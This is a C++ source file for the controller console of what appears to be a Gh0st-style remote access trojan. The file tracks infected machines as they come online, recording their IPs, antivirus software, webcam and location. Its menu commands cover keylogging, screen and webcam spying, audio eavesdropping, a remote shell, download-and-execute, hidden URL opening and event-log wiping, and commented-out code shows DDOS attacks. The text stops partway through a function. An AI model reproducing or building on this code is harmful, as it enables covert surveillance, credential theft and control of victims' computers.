// ClientView.cpp : implementation of the CClientView class
//

#include "stdafx.h"
#include "Client.h"

#include "ClientDoc.h"
#include "ClientView.h"
#include "MainFrm.h"
#include "TabView.h"
#include "ChangeGroup.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "SysInfo.h"
#include "MsgBox.h"
#include "InputDlg.h"
// #include "DDOSAttackDlg.h"
#include "LogView.h"
#include <mmsystem.h>  //导入声音头文件
#pragma comment(lib,"winmm.lib") //导入声音头文件库

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pConnectView;
extern CTabView* g_pTabView;
extern CMainFrame* g_pFrame;
extern CLogView* g_pLogView;

typedef struct
{
	char	*title;
	int		nWidth;
}LISTHEAD;

LISTHEAD g_Column_Data[] = 
{
//	{_T("ID"),				60	},//0
	{_T("外网-IP"),			116	},//1
	{_T("内网-IP"),			102	},//2
	{_T("计算机名/备注"),	103	},//3
	{_T("操作系统"),		70	},//4
	{_T("CPU信息"),			75	},//5
	{_T("内存大小"),		65	},//6
	{_T("速度"),			46	},//7
	{_T("视频"),			36	},//8
    {_T("网卡"),			55	},//9
	{_T("杀毒软件"),		65	},//10
	{_T("开机时间"),		100	},//11
	{_T("版本"),			57	},//12
//	{_T("DDOS"),		  	50	},//13
	{_T("地理位置"),		130	}
};

int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8);// - !((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist;
/////////////////////////////////////////////////////////////////////////////
// CClientView

IMPLEMENT_DYNCREATE(CClientView, CXTPListView)

BEGIN_MESSAGE_MAP(CClientView, CXTPListView)
	//{{AFX_MSG_MAP(CClientView)
	ON_WM_SIZE()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_WEBCAM, OnWebcam)
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
	ON_COMMAND(IDM_SYSTEM, OnSystem)
	ON_COMMAND(IDM_REMOTESHELL, OnRemoteshell)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
	ON_COMMAND(IDM_CLEANEVENT, OnCleanevent)
	ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
	ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
	ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
	ON_COMMAND(IDM_SHOWMSG, OnShowmsg)
	ON_COMMAND(IDM_CHANGEGROUP, OnChangegroup)
	ON_COMMAND(IDM_SYSINFO, OnSysinfo)
// 	ON_COMMAND(IDM_DDOS, OnDdos)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSYSINFODIALOG, OnOpenSysInfoDialog)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClientView construction/destruction

CClientView::CClientView()
{
	// TODO: add construction code here
	CountID = 0;

// 	m_AutoAttack = FALSE;

	if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath(_T("QQWry.Dat"));
	}

	((CClientApp *)AfxGetApp())->m_pConnectView = this;
	m_pListCtrl = NULL;
}

CClientView::~CClientView()
{
}

BOOL CClientView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= LVS_REPORT;
	return CXTPListView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CClientView drawing

void CClientView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

void CClientView::OnInitialUpdate() 
{
	CXTPListView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	m_pListCtrl = &GetListCtrl();

	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_pListCtrl->m_hWnd, hImageListSmall, LVSIL_SMALL);
	m_pListCtrl->SetExtendedStyle(LVIF_PARAM |LVS_EX_FULLROWSELECT |LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	
	if ( m_pListCtrl->GetHeaderCtrl()-> GetItemCount() > 0)
	{
		return;
	}
	
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
	}

	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
	m_header.EnablePopupMenus(TRUE);
   	EnableControls(FALSE);
	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);	
    EnableUserSortColor(true);
}

void CClientView::NewInitialUpdate()
{
	CXTPListView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	m_pListCtrl = &GetListCtrl();

	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_pListCtrl->m_hWnd, hImageListSmall, LVSIL_SMALL);
	m_pListCtrl->SetExtendedStyle(LVIF_PARAM |LVS_EX_FULLROWSELECT |LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	
	if ( m_pListCtrl->GetHeaderCtrl()-> GetItemCount() > 0)
	{
		return;
	}
	
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
	}

	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
	m_header.EnablePopupMenus(TRUE);
   	EnableControls(FALSE);
	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);	
    EnableUserSortColor(true);
}

/////////////////////////////////////////////////////////////////////////////
// CClientView diagnostics

#ifdef _DEBUG
void CClientView::AssertValid() const
{
	CXTPListView::AssertValid();
}

void CClientView::Dump(CDumpContext& dc) const
{	
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CClientDoc)));
	CXTPListView::Dump(dc);
}

#endif
/////////////////////////////////////////////////////////////////////////////
// CClientView message handlers
void CClientView::OnSize(UINT nType, int cx, int cy) 
{
	CXTPListView::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (m_pListCtrl == NULL)
		return;
	
	CRect rcClient;
	GetClientRect(rcClient);
	
	int	nClientWidth = rcClient.Width();
	int nIndex = g_Column_Count - 1;
	
	if (nClientWidth < g_Column_Width)
		return;
	
	m_pListCtrl->SetColumnWidth(nIndex, nClientWidth - g_Column_Width + g_Column_Data[nIndex].nWidth);
}


void CClientView::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	
	// set sort image for header and sort column.
	//	m_listCtrl.SetSortImage(m_nSortedCol, m_bAscending);
	CXTPSortClass csc(m_pListCtrl, m_nSortedCol);
	csc.Sort(m_bAscending, xtpSortString);
}

BOOL CClientView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
{
	// TODO: Add your specialized code here and/or call the base class
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA || pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		SortColumn(pHDNotify->iItem, !m_bAscending);
	}
	return CXTPListView::OnNotify(wParam, lParam, pResult);
}

void CClientView::EnableControls(BOOL bRedraw)
{
	XTOSVersionInfo()->IsWinXPOrGreater();
	XTOSVersionInfo()->IsWinXPOrGreater();
	
	if (bRedraw)
	{
		RedrawWindow(NULL, NULL, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);
	}
}

void CClientView::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme = m_header.GetTheme();
	if (pTheme)
	{
		DWORD dwStyle = pTheme->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme->SetDrawStyle(dwStyle, &m_header);
		m_header.RedrawWindow();
	}
}

void CClientView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	CXTPListView::OnRButtonDown(nFlags, point);
	CMenu	popup;
	popup.LoadMenu(IDR_LIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
// 	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,p.x, p.y, AfxGetMainWnd(), 0, 0, 
 		((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());	
}

int CClientView::FindCountry(CString local)
{
	
	CString country[]={"中国","阿尔巴尼亚","阿联酋","埃及","巴勒斯坦","菲律宾","哈萨克斯坦","韩国","柬埔寨","老挝","罗马尼亚","马来西亚","孟加拉","缅甸","日本","沙特阿拉伯","泰国","土库曼斯坦","乌兹别克斯坦","新加坡","伊朗","以色列","印度","约旦","越南","中非","澳大利亚","斐济","新西兰","印尼","阿根廷","巴拿马","巴西","厄瓜多尔","古巴","加拿大","美国","墨西哥","委内瑞拉","乌拉圭","智利","阿尔巴尼亚","爱尔兰","爱沙尼亚","奥地利","白俄罗斯","保加利亚","比利时","波兰","丹麦","德国","俄罗斯","法国","芬兰","格鲁吉亚","荷兰","捷克","克罗地亚","立陶宛","卢森堡","罗马尼亚","摩纳哥","挪威","葡萄牙","瑞典","瑞士","斯洛伐克","土耳其","乌克兰","西班牙","希腊","匈牙利","意大利","英国","香港","澳门","南非","卡塔尔","黎巴嫩","阿塞拜疆","塞浦路斯","亚美尼亚"};
	
	for (int i =0;i<(sizeof(country)/sizeof(country[0]));i++)
	{
		if (strstr(local,country[i])!=NULL)
		{
			return i;
		}
	}
	return 0;
}

LRESULT CClientView::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	
	CString	strToolTipsText, strOS, strLogText;
	try
	{
		int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		
		// ID
		CString	str;		
		int i = 0;

//		str.Format("%d", CountID++);

//		m_pListCtrl->SetItemText(i,0,str);

// 		// 视频图标
// 		if (LoginInfo->bIsWebCam)
// 		{
// 			i = m_pListCtrl->InsertItem(nCnt, str, 0);
// 		}
// 		else
// 		{
// 			i = m_pListCtrl->InsertItem(nCnt, str, 1);
// 		}
		i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// 外网IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

		m_pListCtrl->SetItemText(i, 0, IPAddress);

		// 内网IP
		m_pListCtrl->SetItemText(i, 1, inet_ntoa(LoginInfo->IPAddress));

		// 主机名
		m_pListCtrl->SetItemText(i, 2, LoginInfo->HostName);

		////////////////////////////////////////////////////////////////////////////////////////
		//操作系统
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			{
				pszOS = _T("NT");
				g_pFrame->nOSCount[0]++;
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				pszOS = _T("2000");
				g_pFrame->nOSCount[1]++;
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				pszOS = _T("XP");
				g_pFrame->nOSCount[2]++;
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				pszOS = _T("2003");
				g_pFrame->nOSCount[3]++;
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Vista"); 
					g_pFrame->nOSCount[4]++;
				}
				else
				{
					pszOS = _T("2008");
					g_pFrame->nOSCount[5]++;
				}
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win 7");
					g_pFrame->nOSCount[6]++;
				}
                else
				{
					pszOS = _T("2008R2");
					g_pFrame->nOSCount[5]++;
				}
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win 8");
					g_pFrame->nOSCount[7]++;
				}
                else
				{
					pszOS = _T("2012");
					g_pFrame->nOSCount[8]++;
				}
			}
		}	
		strOS.Format
			(
			_T("%s SP%d"),// (Build %d)
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor
			//			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		m_pListCtrl->SetItemText(i, 3, strOS);


		// CPU
		str.Format(_T("%d*%dMHz"), LoginInfo->nCPUNumber,LoginInfo->dwCPUClockMhz);
		m_pListCtrl->SetItemText(i, 4, str);

		//内存大小
		str.Format(_T("%dMB"), LoginInfo->MemSize);
 		m_pListCtrl->SetItemText(i, 5, str);

		// 网络延时
		str.Format("%d/mS", LoginInfo->Speed);
		m_pListCtrl->SetItemText(i, 6, str);
         
        //SP
		str = LoginInfo->bIsWebCam ? _T("Yes") : _T("-/-");
		m_pListCtrl->SetItemText(i, 7, str);

		strToolTipsText.Format("Host	: %s\nCam	: %s\nIP	: %s\nOS	: Windows %s\nGroup	: %s", LoginInfo->HostName, str, IPAddress, strOS, LoginInfo->UpGroup);

		// 网卡
        if (LoginInfo->dwSpeed >= 1000)
        {
                  str.Format("%dGbps", LoginInfo->dwSpeed/1000);
        }
        else{
                  str.Format("%dMbps", LoginInfo->dwSpeed);
        }
        m_pListCtrl->SetItemText(i, 8, str); //主机列表的网卡速率所在位置

		// 杀毒软件
		str.Format("%s", LoginInfo->SVirus);
		m_pListCtrl->SetItemText(i, 9, str);

		//运行时间
		str.Format("%s", LoginInfo->RunTime);
        m_pListCtrl->SetItemText(i,10,str);


		//版本信息
		m_pListCtrl->SetItemText(i, 11, LoginInfo->szVersion);

		//DDOS
	//	m_pListCtrl->SetItemText(i,10,"空闲");

		if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
		{
			//地理位置
			str = m_QQwry->IPtoAdd(IPAddress);
			m_pListCtrl->SetItemText(i, 12, str);
			strToolTipsText += _T("\nArea	:");
			strToolTipsText += str;
			IPAddress += "-";
			IPAddress += str;
		}
		else
		{
			m_pListCtrl->SetItemText(i, 12, _T("无纯真数据库"));
		}
		// 指定唯一标识
		m_pListCtrl->SetItemData(i, (DWORD) pContext);

        // 更新当前连接总数
		g_pFrame->ShowConnectionsNumber();
		g_pTabView->UpDateNumber();
		g_pFrame->ShowOSCount();

//		SendAutoAttack(pContext);//DDOS新上线自动参与

if (!((CClientApp *)AfxGetApp())->m_bIsDisablePopTips)
			g_pFrame->ShowToolTips(strToolTipsText);

		if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
			strLogText.Format( "主机上线: [%s]   OS: [%s]   Ver: [%s]   地理位置: [%s]   分组: [%s]", IPAddress, strOS, LoginInfo->szVersion, str, LoginInfo->UpGroup );
		else
			str = m_pListCtrl->GetItemText( i, 12 );
			strLogText.Format( "主机上线: [%s]   OS: [%s]   Ver: [%s]   地理位置: [%s]   分组: [%s]", IPAddress, strOS, LoginInfo->szVersion, str, LoginInfo->UpGroup );
	//		strLogText.Format( "主机上线: [%s]   OS: [%s]   Ver: [%s]   分组: [%s]", IPAddress, strOS,LoginInfo->szVersion, LoginInfo->UpGroup );
		g_pLogView->InsertLogItem( strLogText, 0, 44 );


		//播放声音/////////////////////////////////////////////////////////////////
		if (!((CClientApp *)AfxGetApp())->m_bisDisableSound)
		{
			char Path[200]={0};
			GetModuleFileName(NULL,Path,200);
			*strrchr(Path,'\\')=0;
			strcat(Path,"\\Sound\\Login.wav");
			strToolTipsText=m_IniFile.GetString("Settings","Sound");
			if (strToolTipsText.IsEmpty())
				strToolTipsText=Path;
			sndPlaySound (strToolTipsText,SND_ASYNC);
		}
		//////////////////////////////////////////////////////////////////////////

	}catch(...){}

	return 0;
}
	
LRESULT CClientView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	CClientView* pView = NULL;
	CString strOSCount,strLogText,strVersion,IPaddress,strAddr;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		// 删除链表过程中可能会删除Context
		try
		{
			int nCnt = pView->m_pListCtrl->GetItemCount();
			for (int i=0; i < nCnt; i++)
			{
				if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
				{
					strOSCount = pView->m_pListCtrl->GetItemText( i, 3 );
					if ( strOSCount.Find(_T("NT")) != -1 )
					{
						g_pFrame->nOSCount[0]--;
					}
					if ( strOSCount.Find(_T("XP")) != -1 )
					{
						g_pFrame->nOSCount[2]--;
					}
					if ( strOSCount.Find(_T("Vista")) != -1 )
					{
						g_pFrame->nOSCount[4]--;
					}
					if ( strOSCount.Find(_T("Win 7")) != -1 )
					{
						g_pFrame->nOSCount[6]--;
					}
					if ( strOSCount.Find(_T("2000")) != -1 )
					{
						g_pFrame->nOSCount[1]--;
					}
					if ( strOSCount.Find(_T("2003")) != -1 )
					{
						g_pFrame->nOSCount[3]--;
					}
					if ( strOSCount.Find(_T("2008")) != -1 )
					{
						g_pFrame->nOSCount[5]--;
					}
					if ( strOSCount.Find(_T("Win 8")) != -1 )
					{
						g_pFrame->nOSCount[7]--;
					}
					if ( strOSCount.Find(_T("2012")) != -1 )
					{
						g_pFrame->nOSCount[8]--;
					}
					IPaddress = pView->m_pListCtrl->GetItemText( i, 0 );
					strVersion = m_pListCtrl->GetItemText( i, 11);
					strOSCount.Replace("Win ", "");

					if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
					{
						strAddr = m_pListCtrl->GetItemText( i, 12 );
						strLogText.Format( "主机下线: [%s]   OS: [Win %s]   Ver: [%s]   地理位置: [%s]",IPaddress,strOSCount,strVersion,strAddr);
					}else

					{
						strAddr = m_pListCtrl->GetItemText( i, 12 );
						strLogText.Format( "主机下线: [%s]   OS: [Win %s]   Ver: [%s]   地理位置: [%s]",IPaddress,strOSCount,strVersion,strAddr);
			//			strLogText.Format( "主机下线: [%s]   OS: [Win %s]   Ver: [%s]     ",IPaddress,strOSCount,strVersion);
					}
					g_pLogView->InsertLogItem( strLogText, 0, 27 );

					pView->m_pListCtrl->DeleteItem(i);
					break;
				}		
			}
			// 关闭相关窗口
			
			switch (pContext->m_Dialog[0])
			{
			case FILEMANAGER_DLG:
			case SCREENSPY_DLG:
			case WEBCAM_DLG:
			case AUDIO_DLG:
			case KEYBOARD_DLG:
			case SYSTEM_DLG:
			case SHELL_DLG:
			case SYSINFO_DLG:
				//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
				((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
				break;
			default:
				break;
			}
	}catch(...){}
	
	}
	// 更新当前连接总数
	g_pFrame->ShowOSCount();
	g_pFrame->ShowConnectionsNumber();
	g_pTabView->UpDateNumber();
	return 0;
}

void CClientView::OnChangegroup() 
{
	// TODO: Add your command handler code here
		if(m_pListCtrl->GetSelectedCount() == NULL)
	{
		AfxMessageBox("请选择主机!");
		return ;
	}
	CChangeGroup m_group;
	CString str;
	if ( m_group.DoModal() == IDOK )
	{	
		str = m_group.strGroup.GetBuffer(0);
		int	nPacketLength = str.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		delete []lpPacket;
		
		CString strTemp, strGroupName;
		CClientView* pView = NULL;
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if ( n > 0)
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}
			if ( strGroupName == m_group.strGroup )
			{
				pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
				break;
			}
		}
		if ( pView == NULL )
		{
			strTemp.Format( "%s(0)", m_group.strGroup );
			g_pTabView->AddGroup( strTemp );
			pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(count)->GetHandle()));
		}
		
		POSITION pos;
		for(; pos = m_pListCtrl->GetFirstSelectedItemPosition();)
		{
			int m = m_pListCtrl->GetNextSelectedItem(pos);
			
			CString	str;
			ClientContext	*pContext = (ClientContext *)(m_pListCtrl->GetItemData(m));
			
// 			int nCnt = pView->m_pListCtrl->GetItemCount();
// 			int i = 0;
// 			//i = pView->m_pListCtrl->InsertItem(nCnt, "", 0);//原来为0时 分组图标不会变！
// 			
// 			// 外网IP
			sockaddr_in sockAddr;
			memset(&sockAddr, 0, sizeof(sockAddr));
			int nSockAddrLen = sizeof(sockAddr);
			BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*) & sockAddr, &nSockAddrLen);
			CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
// 			
// 			/////////////////////////////////////////////////////////////////////////////////
// 			LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
// 			if (LoginInfo->bIsWebCam)
// 			{
// 				i = pView->m_pListCtrl->InsertItem(nCnt, "", 0);
// 			}
// 			else
// 			{
// 				i = pView->m_pListCtrl->InsertItem(nCnt, "", 1);
// 			}
			int nCnt = pView->m_pListCtrl->GetItemCount();
			int i = 0;
			i = pView->m_pListCtrl->InsertItem(nCnt, str, 15);
			/////////////////////////////////////////////////////////////////////////////////

			pView->m_pListCtrl->SetItemText(i, 0, m_pListCtrl->GetItemText(m, 0));
			
			pView->m_pListCtrl->SetItemText(i, 1, m_pListCtrl->GetItemText(m, 1));
			
			pView->m_pListCtrl->SetItemText(i, 2, m_pListCtrl->GetItemText(m, 2));
			
			pView->m_pListCtrl->SetItemText(i, 3, m_pListCtrl->GetItemText(m, 3));
			
			pView->m_pListCtrl->SetItemText(i, 4, m_pListCtrl->GetItemText(m, 4));

			pView->m_pListCtrl->SetItemText(i, 5, m_pListCtrl->GetItemText(m, 5));
			
			pView->m_pListCtrl->SetItemText(i, 6, m_pListCtrl->GetItemText(m, 6));
			
			pView->m_pListCtrl->SetItemText(i, 7, m_pListCtrl->GetItemText(m, 7));

			pView->m_pListCtrl->SetItemText(i, 8, m_pListCtrl->GetItemText(m, 8));
			
			pView->m_pListCtrl->SetItemText(i, 9, m_pListCtrl->GetItemText(m, 9));
			
			pView->m_pListCtrl->SetItemText(i, 10, m_pListCtrl->GetItemText(m, 10));
			
			pView->m_pListCtrl->SetItemText(i, 11, m_pListCtrl->GetItemText(m, 11));
			
			pView->m_pListCtrl->SetItemText(i, 12, m_pListCtrl->GetItemText(m, 12));
			
			CString strdiliweizi;
			if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
			{
				strdiliweizi = m_QQwry->IPtoAdd(IPAddress);
				
			}
			else
			{
				strdiliweizi.Format("%s", "没有找到QQWry.dat文件 !");
			}

			// 地理位置
			pView->m_pListCtrl->SetItemText(i, 12, strdiliweizi);
		
			// 指定唯一标识
			pView->m_pListCtrl->SetItemData(i, (DWORD) pContext);
			
			m_pListCtrl->DeleteItem(m);
			g_pFrame->ShowOSCount();

			g_pTabView->UpDateNumber();
			g_pFrame->ShowConnectionsNumber();
		}
	}
}

void CClientView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if ( pos == NULL)
	{
		return;
	}
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		m_iocpServer->Send(pContext, pData, nSize);	// 发送获得驱动器列表数据包
	} 
}

LRESULT CClientView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

LRESULT CClientView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	
	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CClientView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
